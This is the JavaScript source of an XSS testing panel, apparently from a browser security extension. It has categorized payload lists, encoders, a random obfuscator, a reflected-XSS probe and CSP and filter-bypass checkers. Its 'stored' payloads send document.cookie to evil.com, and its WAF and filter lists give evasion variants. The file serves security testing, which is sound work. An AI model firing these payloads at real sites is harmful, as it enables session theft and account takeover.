/**
 * XSS测试器
 */
document.addEventListener('DOMContentLoaded', () => {
  const payloadList = document.getElementById('payload-list');
  const categoryTabs = document.getElementById('category-tabs');
  const customPayload = document.getElementById('custom-payload');
  const encodeSelect = document.getElementById('encode-select');
  const btnEncode = document.getElementById('btn-encode');
  const btnCopyCustom = document.getElementById('btn-copy-custom');
  const btnRandomXss = document.getElementById('btn-random-xss');
  const btnTestCurrent = document.getElementById('btn-test-current');
  const targetUrl = document.getElementById('target-url');
  const encodedResult = document.getElementById('encoded-result');
  const cheatsheetToggle = document.getElementById('cheatsheet-toggle');
  const cheatsheetContent = document.getElementById('cheatsheet-content');
  const toastEl = document.getElementById('toast');
  // ── PostMessage 通信路由 ──
  let _msgId = 0;
  const _pendingMsgs = new Map();

  function _handlePostMessageResponse(event) {
      if (event.origin !== location.origin) return; // 只接受来自本扩展的页面（防止被第三方站点嵌入后驱动）

    if (event.source !== window.parent) return;
    if (!event.data || typeof event.data !== 'object') return;
    const { action, data } = event.data;
    if ((action === '__bgResponse' || action === '__contentResponse') && data && data.__id) {
      const pending = _pendingMsgs.get(data.__id);
      if (pending) {
        _pendingMsgs.delete(data.__id);
        clearTimeout(pending.timer);
        const result = data.result;
        if (action === '__bgResponse' && result && result.success === false && result.error) {
          pending.reject(new Error(result.error));
        } else {
          pending.resolve(result);
        }
      }
    }
  }
  window.addEventListener('message', _handlePostMessageResponse);

  function callBackground(action, data) {
    return new Promise((resolve, reject) => {
      const id = ++_msgId;
      const timer = setTimeout(() => {
        _pendingMsgs.delete(id);
        reject(new Error('后台调用超时'));
      // 本侧超时只是安全网：必须大于 background 的最长超时（服务请求 20s、通用代理最多 60s），
      // 否则慢请求下会先触发本侧超时，用户看到的是"后台调用超时"而不是服务端返回的可读错误。
      // 本侧超时只是安全网：必须大于 background 的最长超时（服务请求 20s、通用代理最多 60s），
    // 否则慢请求下会先触发本侧超时，用户看到的是"后台调用超时"而不是服务端返回的可读错误。
    }, 70000);
      _pendingMsgs.set(id, { resolve, reject, timer });
      window.parent.postMessage({ action: 'callBackground', data: { id, action, data } }, '*');
    });
  }


  const PAYLOADS = {
    basic: [
      '<script>alert(1)</script>',
      '<img src=x onerror=alert(1)>',
      '<svg onload=alert(1)>',
      '<body onload=alert(1)>',
      '<input onfocus=alert(1) autofocus>',
      '<details open ontoggle=alert(1)>',
      '<marquee onstart=alert(1)>',
      '<isindex action=javascript:alert(1)>',
      '<iframe src="javascript:alert(1)">',
      '<a href="javascript:alert(1)">click</a>',
      '<div onmouseover=alert(1)>hover</div>',
      '<select onfocus=alert(1) autofocus>',
      '<textarea onfocus=alert(1) autofocus>',
      '<video src=x onerror=alert(1)>',
      '<audio src=x onerror=alert(1)>'
    ],
    event: [
      'onerror=alert(1)',
      'onload=alert(1)',
      'onmouseover=alert(1)',
      'onfocus=alert(1)',
      'onclick=alert(1)',
      'onmouseout=alert(1)',
      'ondblclick=alert(1)',
      'onkeydown=alert(1)',
      'onkeypress=alert(1)',
      'onkeyup=alert(1)'
    ],
    tag: [
      '<img src=x onerror=alert(1)>',
      '<svg/onload=alert(1)>',
      '<body onload=alert(1)>',
      '<input onfocus=alert(1) autofocus>',
      '<details open ontoggle=alert(1)>',
      '<marquee onstart=alert(1)>',
      '<isindex action=javascript:alert(1)>',
      '<math><mtext></mtext><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">',
      '<xmp><p onclick=alert(1)>xxx</p>',
      '<object data="javascript:alert(1)">'
    ],
    encode: [
      '&#60;script&#62;alert(1)&#60;/script&#62;',
      '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e',
      '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e',
      'PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
      '%3Cscript%3Ealert(1)%3C/script%3E',
      '&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;',
      '\\x3cimg src=x onerror=alert(1)\\x3e',
      '%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E'
    ],
    filter: [
      '<sCrIpT>alert(1)</ScRiPt>',
      '<scr<script>ipt>alert(1)</scr</script>ipt>',
      '<scr\x00ipt>alert(1)</script>',
      '<img src=x onerror="&#x61;lert(1)">',
      '"><script>alert(1)</script>',
      "'-alert(1)-'",
      '<img src=x onerror=alert`1`>',
      '<svg/onload=alert(1)>',
      '<ScRiPt>alert(1)</ScRiPt>',
      '<script/**/>alert(1)</script>',
      '<script/x>alert(1)</script>',
      '<script/src=//evil.com/x.js></script>',
      '<svg><![CDATA[<script>alert(1)<\/script>]]></svg>'
    ],
    // WAF 绕过技术：针对常见 WAF (Cloudflare/Akamai/AWS WAF/F5) 的绕过 payload
    waf: [
      '<svg/onload=alert(/XSS/.source)>',
      '<img src=x onerror="window['+String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+'](1)">',
      '<iframe src="javascript:alert(`xss`)">',
      '<svg><script>alert(1)</script></svg>',
      '<math><maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(1)">click</maction></math>',
      '<form><button formaction="javascript:alert(1)">X</button></form>',
      '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
      '<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
      '<svg/onload=eval(atob(\'YWxlcnQoMSk=\'))>',
      '<details/open/ontoggle="eval(window.name)">',
      '<a href="javascript:void(0)" onclick="eval(atob(\'YWxlcnQoMSk=\'))">test</a>',
      '<img src=x onerror="`${alert(1)}`">',
      '<svg/onload="`alert(1)`">',
      '<style onload=eval(atob(\'YWxlcnQoMSk=\'))>',
      '<body onload="eval(atob(\'YWxlcnQoMSk=\'))">',
      '<iframe/src="javascript:eval(atob(\'YWxlcnQoMSk=\'))">',
      '<input onfocus=eval(name) autofocus>',
      '<select onfocus=eval(name) autofocus>',
      '<textarea onfocus=eval(name) autofocus>',
      '<keygen onfocus=eval(name) autofocus>'
    ],
    // 上下文感知 payload：针对 HTML/JS/属性/URL 不同注入上下文
    context: [
      // HTML 上下文
      '--&gt;<script>alert(1)</script>',
      '--&gt;<img src=x onerror=alert(1)>',
      // JS 字符串上下文（单引号）
      "';alert(1);//",
      "';alert(String.fromCharCode(88,83,83));//",
      // JS 字符串上下文（双引号）
      '";alert(1);//',
      '";alert(String.fromCharCode(88,83,83));//',
      // JS 模板字符串上下文
      '`${alert(1)}`',
      // HTML 属性上下文（双引号）
      '" onfocus="alert(1)" autofocus="',
      '" onmouseover="alert(1)"',
      '" onerror="alert(1)"',
      // HTML 属性上下文（单引号）
      "' onfocus='alert(1)' autofocus='",
      "' onmouseover='alert(1)'",
      // URL/href 上下文
      'javascript:alert(1)',
      'javascript:alert(document.domain)',
      'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
      // script 标签上下文内的注入
      '</script><script>alert(1)</script>',
      '//\\nalert(1);',
      '/* */alert(1)/* */',
      // style 属性上下文
      'expression(alert(1))',
      'background:url(javascript:alert(1))',
      // 注释上下文
      '--><img src=x onerror=alert(1)>',
      '<!--<img src=x onerror=alert(1)>-->',
      // JSON 响应上下文
      '";alert(1);//',
      "';alert(1);//"
    ],
    dom: [
      'javascript:alert(document.domain)//',
      '#"><img src=x onerror=alert(1)>',
      'data:text/html,<script>alert(1)</script>',
      '<img src=1 onerror=eval(atob("YWxlcnQoMSk="))>',
      '<svg><script>alert&#40;1&#41;</script></svg>',
      '"><iframe src=javascript:alert(1)>'
    ],
    stored: [
      '<script>document.location="https://evil.com/?c="+document.cookie</script>',
      '<img src=x onerror="new Image().src=\'https://evil.com/?c=\'+document.cookie">',
      '<svg onload="fetch(\'https://evil.com/?c=\'+document.cookie)">',
      '<input onfocus="fetch(\'https://evil.com/?c=\'+document.cookie)" autofocus>',
      '<details open ontoggle="fetch(\'https://evil.com/?c=\'+document.cookie)">'
    ],
    // 反射型 XSS：服务端将输入直接反射到响应中的 payload，通常通过 URL 参数注入
    reflected: [
      // 基础反射探测
      '<script>alert(1)</script>',
      '<img src=x onerror=alert(1)>',
      '<svg onload=alert(1)>',
      // 闭合 HTML 上下文
      '"><script>alert(1)</script>',
      "'><script>alert(1)</script>",
      '"><img src=x onerror=alert(1)>',
      "'><img src=x onerror=alert(1)>",
      // 闭合属性上下文
      '" autofocus onfocus="alert(1)',
      "' autofocus onfocus='alert(1)",
      '" onmouseover="alert(1)',
      "' onmouseover='alert(1)",
      // 闭合 JS 上下文
      "';alert(1);//",
      '";alert(1);//',
      // URL 参数反射探测
      'test<payload>',
      '"><svg/onload=alert(1)>',
      // 错误页/搜索结果反射
      '<plaintext>',
      '<!--',
      '-->',
      // 编码反射绕过
      '%22%3E%3Cscript%3Ealert(1)%3C/script%3E',
      '%27%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E',
      // 多步骤反射
      '"><a href="javascript:alert(1)">click</a>',
      '"><iframe src="javascript:alert(1)">',
      '"><details open ontoggle="alert(1)">',
      // 反射探测标记
      'xsstest12345marker',
      '"><mark>xssprobe</mark>',
      // 利用 SVG 与数学上下文
      '"><math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
      '"><svg><desc><table><svg><style><img src=x onerror=alert(1)>',
      // 多重编码反射
      '&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;',
      '&#34;&#62;&#60;script&#62;alert(1)&#60;/script&#62;'
    ]
  };

  let currentCategory = 'basic';

  function escapeHtml(str) {
    if (str == null) return '';
    return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
  }

  function showToast(msg, type = 'info') {
    toastEl.textContent = msg;
    toastEl.className = 'toast toast--' + type;
    toastEl.classList.add('toast--show');
    setTimeout(() => toastEl.classList.remove('toast--show'), 3000);
  }

  function renderPayloads(category) {
    const items = PAYLOADS[category] || [];
    payloadList.innerHTML = items.map((p, i) => `
      <div class="payload-item">
        <code>${escapeHtml(p)}</code>
        <button class="btn-copy" data-payload="${escapeHtml(p)}" title="复制">📋</button>
      </div>
    `).join('');
  }

  // Category tab switching
  categoryTabs.addEventListener('click', (e) => {
    const tab = e.target.closest('.category-tab');
    if (!tab) return;
    document.querySelectorAll('.category-tab').forEach(t => t.classList.remove('active'));
    tab.classList.add('active');
    currentCategory = tab.dataset.cat;
    renderPayloads(currentCategory);
  });

  // Copy payload
  payloadList.addEventListener('click', (e) => {
    const btn = e.target.closest('.btn-copy');
    if (!btn) return;
    const payload = btn.dataset.payload;
    navigator.clipboard.writeText(payload).then(() => {
      showToast('已复制到剪贴板');
      _saveToHistory('copy', payload);
    }).catch(() => showToast('复制失败', 'error'));
  });

  // Encode custom payload
  btnEncode.addEventListener('click', () => {
    const raw = customPayload.value;
    if (!raw) { showToast('请输入payload', 'error'); return; }
    const method = encodeSelect.value;
    let result = '';
    switch (method) {
      case 'html':
        result = raw.replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c] || c));
        break;
      case 'unicode':
        result = raw.split('').map(c => '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0')).join('');
        break;
      case 'hex':
        result = raw.split('').map(c => '\\x' + c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
        break;
      case 'base64':
        try { result = btoa(unescape(encodeURIComponent(raw))); } catch { result = '编码失败'; }
        break;
      case 'url':
        result = encodeURIComponent(raw);
        break;
      default:
        result = raw;
    }
    encodedResult.textContent = result;
    encodedResult.classList.add('visible');
  });

  // Copy custom/encoded
  btnCopyCustom.addEventListener('click', () => {
    const text = encodedResult.classList.contains('visible') ? encodedResult.textContent : customPayload.value;
    if (!text) { showToast('无内容可复制', 'error'); return; }
    navigator.clipboard.writeText(text).then(() => showToast('已复制到剪贴板')).catch(() => showToast('复制失败', 'error'));
  });

  // Random XSS generator
  btnRandomXss.addEventListener('click', () => {
    const allPayloads = Object.values(PAYLOADS).flat();
    const base = allPayloads[Math.floor(Math.random() * allPayloads.length)];
    const encodings = ['html', 'unicode', 'hex', 'url'];
    const enc = encodings[Math.floor(Math.random() * encodings.length)];
    let result = base;
    // Randomly apply a transformation
    const transforms = [
      () => base.replace(/alert/i, 'ALeRT'),
      () => base.replace(/</g, '%3c').replace(/>/g, '%3e'),
      () => base.replace(/script/i, 'sc\x00ript'),
      () => base.replace(/alert\((.*?)\)/, (m, a) => `eval(atob("${btoa('alert(' + a + ')')}"))`),
      () => base
    ];
    result = transforms[Math.floor(Math.random() * transforms.length)]();
    customPayload.value = result;
    encodedResult.classList.remove('visible');
    showToast('已生成随机XSS变体');
    _saveToHistory('random', result);
  });

  /**
   * 反射型 XSS 检测（真实检测，不是"打开页面看看"）
   *
   * 旧实现的「在当前页面测试」只是把目标 URL 在新标签页打开，没有任何检测行为，
   * 与"测试 XSS"的描述完全不符。
   *
   * 现在的做法：把 payload 作为查询参数附加到目标 URL，由后台代理获取响应体，
   * 检查 payload 是否**原样**出现在响应里。若原样出现（未被 HTML 实体转义），
   * 说明该参数会被反射进页面，存在反射型 XSS 风险；若被转义（如 `<` → `&lt;`）
   * 则说明服务端做了输出编码，该 payload 无法生效。
   *
   * 局限（如实说明）：这只是静态反射检测，无法覆盖 DOM 型 XSS、需要交互触发的
   * 存储型 XSS，以及经过多层编码/过滤的场景。精确验证仍需在浏览器中实际执行。
   */
  btnTestCurrent.addEventListener('click', async () => {
    const url = targetUrl.value.trim();
    if (!url) { showToast('请输入目标URL', 'error'); return; }
    if (!/^https?:\/\//i.test(url)) { showToast('请输入以 http(s):// 开头的 URL', 'error'); return; }

    const resultEl = document.getElementById('xss-test-result');
    if (resultEl) {
      resultEl.style.display = 'block';
      resultEl.innerHTML = '<div style="color:var(--tt-text-tertiary);font-size:12px">⏳ 正在检测反射型 XSS...</div>';
    }

    // 选取一批代表性 payload（基础向量 + 事件向量），逐个检测
    const testPayloads = (PAYLOADS.basic || []).slice(0, 8);
    const rows = [];
    for (const payload of testPayloads) {
      let probeUrl;
      try {
        const u = new URL(url);
        u.searchParams.set('xss', payload);
        probeUrl = u.toString();
      } catch (e) { continue; }

      try {
        const resp = await callBackground('fetchUrl', { url: probeUrl, method: 'GET', timeout: 15000 });
        const body = (resp && resp.success && resp.body) || '';
        // 原样出现 = 未转义，存在反射风险；被 HTML 实体转义 = 已编码，安全
        const rawReflected = body.indexOf(payload) !== -1;
        const escapedReflected = /&lt;|&gt;|&quot;|&#x?[0-9a-f]+;/i.test(body) && !rawReflected;
        rows.push({
          payload,
          reflected: rawReflected,
          encoded: escapedReflected && !rawReflected,
          status: (resp && resp.success) ? resp.status : 0
        });
      } catch (e) {
        rows.push({ payload, reflected: false, encoded: false, status: 0, error: e.message });
      }
    }

    if (resultEl) {
      const reflectedCount = rows.filter(r => r.reflected).length;
      const summary = reflectedCount > 0
        ? `<div style="color:#e53935;font-weight:600;margin-bottom:6px">🚨 发现 ${reflectedCount} 个 payload 被原样反射，存在反射型 XSS 风险</div>`
        : `<div style="color:var(--tt-success);font-weight:600;margin-bottom:6px">✅ 未发现原样反射的 payload（均已转义或未回显）</div>`;
      resultEl.innerHTML = summary +
        '<table style="width:100%;font-size:11px;border-collapse:collapse"><thead><tr>'
        + '<th style="text-align:left;padding:4px;border-bottom:1px solid var(--tt-border)">Payload</th>'
        + '<th style="text-align:left;padding:4px;border-bottom:1px solid var(--tt-border)">HTTP</th>'
        + '<th style="text-align:left;padding:4px;border-bottom:1px solid var(--tt-border)">结果</th>'
        + '</tr></thead><tbody>'
        + rows.map(r => {
          const res = r.error
            ? '<span style="color:var(--tt-text-tertiary)">检测失败</span>'
            : r.reflected
              ? '<span style="color:#e53935;font-weight:600">⚠️ 原样反射</span>'
              : r.encoded
                ? '<span style="color:var(--tt-success)">已转义</span>'
                : '<span style="color:var(--tt-text-tertiary)">未回显</span>';
          const p = String(r.payload).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
          return '<tr><td style="padding:4px;border-bottom:1px solid var(--tt-border)"><code>' + p + '</code></td>'
            + '<td style="padding:4px;border-bottom:1px solid var(--tt-border)">' + (r.status || '—') + '</td>'
            + '<td style="padding:4px;border-bottom:1px solid var(--tt-border)">' + res + '</td></tr>';
        }).join('')
        + '</tbody></table>'
        + '<div style="font-size:11px;color:var(--tt-text-tertiary);margin-top:6px">ℹ️ 本检测为静态反射检查：payload 以查询参数 xss 注入并检查响应体是否原样包含它。'
        + '无法覆盖 DOM 型 XSS、需交互触发的存储型 XSS 及多层编码场景，精确验证请在浏览器中实际执行。</div>';
    }
  });

  // Cheatsheet toggle
  cheatsheetToggle.addEventListener('click', () => {
    cheatsheetContent.classList.toggle('visible');
  });

  // ==================== XSS 上下文检测 ====================
  function detectXSSContext(input) {
    const contexts = [];
    if (/<[^>]+>/.test(input)) contexts.push({ type: 'HTML标签', desc: '输入包含HTML标签，可能在HTML上下文中', risk: 'high' });
    if (/="[^"]*?/.test(input) || /='[^']*'?/.test(input)) contexts.push({ type: '属性值', desc: '输入在HTML属性值中', risk: 'high' });
    if (/javascript:/i.test(input)) contexts.push({ type: 'URL/协议', desc: '输入包含javascript协议', risk: 'critical' });
    if (/style\s*=/i.test(input)) contexts.push({ type: 'CSS', desc: '输入在style属性中', risk: 'medium' });
    if (/on\w+\s*=/i.test(input)) contexts.push({ type: '事件处理', desc: '输入包含事件处理器', risk: 'critical' });
    if (/<script/i.test(input)) contexts.push({ type: 'JS脚本', desc: '输入在script标签中', risk: 'critical' });
    if (/url\(/i.test(input)) contexts.push({ type: 'CSS URL', desc: '输入在CSS url()中', risk: 'medium' });
    if (contexts.length === 0) contexts.push({ type: '纯文本', desc: '输入未包含特殊上下文标记', risk: 'low' });
    return contexts;
  }

  var btnDetectCtx = document.getElementById('btn-detect-context');
  var contextResult = document.getElementById('context-result');
  if (btnDetectCtx && contextResult) {
    btnDetectCtx.addEventListener('click', () => {
      const input = customPayload.value;
      if (!input) { showToast('请输入payload', 'error'); return; }
      const contexts = detectXSSContext(input);
      contextResult.innerHTML = contexts.map(c =>
        '<div style="padding:4px 8px;font-size:12px;border-left:3px solid ' +
        (c.risk === 'critical' ? '#ef4444' : c.risk === 'high' ? '#f59e0b' : 'var(--tt-primary)') +
        ';margin-bottom:4px"><strong>' + c.type + '</strong> — ' + c.desc + ' <span style="color:' +
        (c.risk === 'critical' ? '#ef4444' : c.risk === 'high' ? '#f59e0b' : 'var(--tt-text-tertiary)') +
        '">(' + c.risk + ')</span></div>'
      ).join('');
    });
  }

  // ==================== CSP 绕过检测 ====================
  var btnCheckCsp = document.getElementById('btn-check-csp');
  var cspResult = document.getElementById('csp-result');
  if (btnCheckCsp && cspResult) {
    btnCheckCsp.addEventListener('click', async () => {
      const url = targetUrl.value.trim();
      if (!url) { showToast('请输入目标URL', 'error'); return; }
      cspResult.innerHTML = '<div style="color:var(--tt-text-tertiary);font-size:12px">⏳ 检测CSP策略中...</div>';
      try {
        const response = await callBackground('fetchSecurityHeaders', { url: url });
        if (response && response.headers) {
          const csp = response.headers['content-security-policy'];
          if (!csp) {
            cspResult.innerHTML = '<div style="color:#ef4444;font-size:12px">⚠️ 未发现CSP策略 — 站点未设置Content-Security-Policy头</div>';
          } else {
            let html = '<div style="font-size:12px"><strong>CSP策略:</strong></div>';
            html += '<pre style="font-size:11px;white-space:pre-wrap;background:var(--tt-bg-secondary);padding:8px;border-radius:4px;max-height:150px;overflow:auto">' + escapeHtml(csp) + '</pre>';
            // 分析CSP绕过可能
            const bypasses = [];
            if (/script-src[^;]*'unsafe-inline'/.test(csp)) bypasses.push('⚠️ script-src包含unsafe-inline — 内联脚本可执行');
            if (/script-src[^;]*'unsafe-eval'/.test(csp)) bypasses.push('⚠️ script-src包含unsafe-eval — eval()可使用');
            if (/script-src[^;]*\*/.test(csp)) bypasses.push('🚨 script-src包含通配符* — 任意脚本源可加载');
            if (!/script-src/.test(csp) && /default-src[^;]*'none'/.test(csp)) bypasses.push('✅ default-src为none — 严格CSP');
            if (/object-src[^;]*'none'/.test(csp)) bypasses.push('✅ object-src为none — 禁止Flash/插件');
            if (!/frame-ancestors/.test(csp)) bypasses.push('ℹ️ 未设置frame-ancestors — 可被iframe嵌入(点击劫持风险)');
            if (bypasses.length > 0) {
              html += '<div style="margin-top:8px">' + bypasses.map(b => '<div style="font-size:12px;padding:2px 0">' + b + '</div>').join('') + '</div>';
            }
            cspResult.innerHTML = html;
          }
        } else {
          cspResult.innerHTML = '<div style="color:var(--tt-text-tertiary);font-size:12px">无法获取CSP信息</div>';
        }
      } catch (e) {
        cspResult.innerHTML = '<div style="color:#ef4444;font-size:12px">检测失败: ' + escapeHtml(e.message) + '</div>';
      }
    });
  }

  // ==================== XSS 过滤规则检测 ====================
  var btnCheckFilter = document.getElementById('btn-check-filter');
  var filterResult = document.getElementById('filter-result');
  if (btnCheckFilter && filterResult) {
    btnCheckFilter.addEventListener('click', () => {
      const input = customPayload.value;
      if (!input) { showToast('请输入payload', 'error'); return; }
      const findings = [];
      // 检测常见过滤
      if (/<script/i.test(input)) findings.push({ rule: 'script标签', bypass: '尝试 <svg/onload=alert(1)> 或 <img src=x onerror=alert(1)>' });
      if (/alert/i.test(input)) findings.push({ rule: 'alert关键字', bypass: '尝试 confirm(1), prompt(1), 或 window["al"+"ert"](1)' });
      if (/on\w+=/i.test(input)) findings.push({ rule: '事件处理器', bypass: '尝试 javascript: 协议或CSS表达式' });
      if (/javascript:/i.test(input)) findings.push({ rule: 'javascript协议', bypass: '尝试 data: 协议或 vbscript: (IE)' });
      if (/\(.*\)/.test(input)) findings.push({ rule: '括号调用', bypass: '尝试反引号: alert`1` 或 throw/onerror' });
      if (findings.length === 0) {
        filterResult.innerHTML = '<div style="font-size:12px;color:var(--tt-success)">✅ 未检测到明显过滤规则匹配</div>';
      } else {
        filterResult.innerHTML = findings.map(f =>
          '<div style="font-size:12px;padding:4px 0;border-bottom:1px solid var(--tt-border-color)">' +
          '<strong>过滤: ' + f.rule + '</strong><br><span style="color:var(--tt-primary)">绕过: ' + f.bypass + '</span></div>'
        ).join('');
      }
    });
  }

  function _saveToHistory(action, payload) {
    try {
      callBackground('saveToHistory', { toolId: 'xss-tester', type: action, data: { payload } });
    } catch (e) {}
  }

  renderPayloads('basic');
});

window.addEventListener('message', (event) => {
      if (event.origin !== location.origin) return; // 只接受来自本扩展的页面（防止被第三方站点嵌入后驱动）

  if (!event.data || event.source !== window.parent) return;
  if (event.data.action === 'setTheme' && event.data.data) {
    document.documentElement.setAttribute('data-theme', event.data.data.theme);
  }
  if (event.data.action === 'setData') {
    const inputArea = document.getElementById('target-url');
    if (inputArea && typeof event.data.data === 'string') {
      inputArea.value = event.data.data;
    }
  }
});
